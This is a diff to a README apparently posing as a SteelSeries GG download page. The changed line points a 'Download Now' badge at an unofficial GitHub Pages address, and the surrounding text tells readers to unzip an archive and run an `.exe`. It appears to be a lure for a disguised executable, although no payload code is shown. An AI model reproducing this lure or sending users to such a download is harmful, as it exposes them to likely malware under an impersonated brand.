@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://steelseries-gg-engine.github.io/.github/)
 
 ## 📸 Overview
   ![steelseries-gg-device](https://github.com/user-attachments/assets/4620031a-e3ae-4575-9b03-01f5eaf5497f)
